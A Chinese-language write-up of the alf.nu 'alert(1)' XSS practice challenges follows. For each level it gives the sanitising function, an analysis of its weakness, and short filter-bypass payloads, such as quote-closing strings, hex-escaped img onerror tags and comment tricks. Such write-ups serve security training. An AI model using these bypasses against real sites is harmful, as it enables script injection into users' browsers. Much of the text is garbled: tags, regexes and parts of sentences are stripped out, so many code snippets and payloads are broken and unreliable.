## 写在前面
最近深感自己前端安全知识掌握的不是很好，于是找了个[XSS靶场](https://alf.nu/alert1)练习下，截止到2019年6月9日，网站上共有29道题目，我当前只做出了26道，还有3道题目没有头绪，分别是`Fruit
3`、`Quine`、`Entities 2`，当然已经做出的这些题目也不一定是最优解，希望与师傅们交流学习下，如果有发现什么错误，欢迎师傅们批评指正。
我的链接
    https://alf.nu/alert(1)#accesstoken=WcMW1j+qtfFu6BQVFdJM
浏览器版本：`Chrome 74`
## 1\. Warmup
### 1.1 源码
    function escape(s) {
        return '';
    }
### 1.2 分析
代码将输入直接拼接到了返回的字符串中，没有任何过滤，直接闭合`console.log("`即可。
### 1.3 Payload
    13个字符
    ");alert(1)//
    12个字符
    ");alert(1,"
[](./img/7212858456729768176.png
"1")
## 2\. Adobe
### 2.1 源码
    function escape(s) {
        s = s.replace(/"/g, '\\"');
        return '';
    }
### 2.2 分析
代码将输入的双引号加了一个`\`进行了转义，这样我们就不能像第一题那样闭合`console.log`了，但是没啥影响，有两种方法：
  * 闭合之前的``标签，然后再写一个`alert(1)//
    方法2 14个字符
    \");alert(1)//
## 3\. JSON
### 3.1 源码
    function escape(s) {
        s = JSON.stringify(s);
        return '';
    }
### 3.2 分析
代码将输入使用`JSON.stringify`进行了处理，与第二题的方法一思路相同。
### 3.3 Payload
    alert(1)//
## 4\. Markdown
### 4.1 源码
    function escape(s) {
        var text = s.replace(/$1');
        // [[img123|Description]]
        text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '');
        return text;
    }
### 4.2 分析
代码进行了三步操作
  1. 第一步，将``。
开头对`"`和`
    32个字符
    Comment#>
## 8\. Template
### 8.1 源码
    function escape(s) {
        function htmlEscape(s) {
            return s.replace(/./g, function (x) {
                return {
                    '': '&gt;',
                    '&': '&amp;',
                    '"': '&quot;',
                    "'": '&#39;'
                }[x] || x;
            });
        }
        function expandTemplate(template, args) {
            return template.replace(
                /{(\w+)}/g,
                function (_, n) {
                    return htmlEscape(args[n]);
                });
        }
        return expandTemplate(
            "                                                \n\
          Hello, !         \n\
                                                 \n\
             var v = document.getElementById('name');    \n\
             v.innerHTML = '{name}';       \n\
                                               \n\
        ", {
                name: s
            }
        );
    }
### 8.2 分析
代码对输入的``、`&`、`"`、`'`、进行了转义，输入的字符串会拼接在`{name}`处。  
由于没有过滤`\`，可以利用`JS`的8进制或者16进制编码来绕过。
### 8.3 Payload
需要注意的是第二个`Payload`末尾有一个空格。
    32个字符
    \x3cimg src onerror=alert(1)\x3e
    26个字符
    \x3cstyle/onload=alert(1)
## 9\. JSON 2
### 9.1 源码
    function escape(s) {
        s = JSON.stringify(s).replace(/`标签进行了过滤，由于正则中存在`i`修饰符，不区分大小写，不能使用大小写混合来绕过。
由于直接将字符串替换为空，可以双写绕过。
### 9.3 Payload
    alert(1)//
## 10\. Callback 2
### 10.1 源码
    function escape(s) {
        // Pass inn "callback#userdata"
        var thing = s.split(/#/);
        if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
        var obj = {
            'userdata': thing[1]
        };
        var json = JSON.stringify(obj).replace(/\//g, '\\/');
        return "";
    }
### 10.2 分析
与第6题的类似，但是转义了`/`，导致`//`这个注释符无法使用，但是`JavaScript`的注释符有三种，分别是`//`、`/**/`、`]/.test(s)) return '-';
        return '';
    }
### 11.2 分析
代码过滤了``。还将所有输入的字母变成了大写，不能借助`toUpperCase()`的特性来解了。  
可以利用`jsfuck`。  